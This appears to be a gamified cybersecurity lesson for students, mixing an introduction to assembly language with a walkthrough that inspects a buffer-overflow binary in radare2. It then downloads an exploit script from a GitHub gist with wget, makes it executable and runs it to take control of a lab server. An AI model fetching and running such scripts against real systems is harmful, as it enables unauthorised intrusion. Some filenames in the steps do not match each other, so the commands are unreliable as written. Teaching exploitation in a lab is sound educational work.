# Welcome to the Final day of Cybersecurity week!

![My guy typing](https://i.insider.com/515583f1eab8ea9a5d00001b?width=1100&format=jpeg&auto=webp)

<div style="margin:auto; display:flex; flex-direction:column; height:500px; max-width:500px">
    <iframe border="0" src="https://crosswordlabs.com/embed/2020-06-24-165?clue_height=30" style="flex:1; width:100%; padding:5px 0px 0 5px; border:3px solid black; "></iframe>
    <a target="_blank" style="align-self:center; font-size:12px; color:black; padding-top:10px; text-decoration:none;text-align:center" href="https://crosswordlabs.com">Crossword Puzzle Maker</a>
</div>

<br> 

Today is the last day of Cybersecurity week. Alice and Bob are pleased with how far you have come in your learnings
and how you have helped the Cyber House in their epic battle against the L33k3rs.

Yesterday you helped the Cyber House achieve a major accomplishment. Alice and Bob, thanks to you, were able to obtain 
information on all member of the L33k3rs. As we speak, Cyber House agents are tracking these people down to put
an end to their l33king schemes

![L33k3rs info](https://udel.codes/cyber4/phishing/L33k3r_Database.png)'

Our battle against the L33k3rs is coming to a close, however there is still one thing left to do.

### The Nano Bots!

We still have to shut down the nano bots. The nano bots are still in the Global Dessert Vault sending recipes to the L33k3rs. In order to stop them, we need being to understand a very important programming language. **Assembly Language.**

# Assembly Language

![Assembly](https://y31uv4ra1.vo.llnwd.net/content/wp/tweaklibrary_com/uploads/2017/07/49561-assembly-language-1280x720.jpg)

Assembly Language is the original true low-level computer language with pure instructions that directly translate into machine code.

*To explain:*

- There are languages that are considered **High-Level Programming Langauges**, these languages include Python, Java, Javascript, Scratch, ect. These programming languages are then broken down to a **Lower-level Programing Language**

- **Low-Level Programming Languages**, like Assembly and Machine Code, communicate more directly with the computer. Meaning they are more closely related to the computer's core language, like binary. (1's and 0's)

*So why have High-Level Languages if they are just turned into a Low-Level Language?*

- This is because Low-Level Languages are difficult to use and harder to understand then High-Level Languages. High-Level Languages are much more easier to read, write, and maintain. If you think coding in general is hard, Assembly is that much harder. 

### Why do we need to know this?

We need to know what assembly does because it is going to help us take down the L33k3rs!

Alice and Bob need us to take control of a L33k3r server so we can destroy it from the inside out! This is called pwning. So we will be compromising another server to gain access, almost like how we used the File Upload Exploit to gain access to the Global Dessert Vault!

---

So, let go to the terminal we have been using the past couple of days:  <a href="http://157.230.203.138/term" target="_blank">TERMINAL</a>

First begin by listing all the files in the home directory
- `ls`

Next we will move into the secsoft directory
- `cd secsoft`

Now let us list the files in this directory
- `ls`

Let's read the bufover-2.c file. This is a c file contiang c code. This will generate 
- `cat bufover-2.c`

Now we will read the bufover-2 file. This file is the executable for the file we just read. Meaning it will run that file.
- `cat bufover-2`

Let's run the executable
- `r2 -Ad bufover-2`

Now that our process is running, lets enter this for the input.
- `Vpp`

What you are seeing is the assembly code for the bufover-2.c file. You can navigate through the code by using the "j" and "k" keys.
To Exit out of this view, press q
- `q`

The program is asking us a few questions, lets answer them by pressing the enter key twice.
- `enter`
- `enter`

Next we are get some code that will help us infiltrate a server. This code is a script we will run which will create a completely new Bash Terminal that will have control over that server
- `wget https://gist.githubusercontent.com/AndyNovo/217341c2818dc569294c86ffafc0ef9b/raw/530536eb4dd081869651f85d1c4ca04f8183b0c7/bash32.sh`

The command below will give the file we just downloaded exectuable permission.
- `chmod +x bash32.ch`

Now let's run out script to infiltrate out local server!
- `./bash32.sh buffer-2 ipaddr port`

---

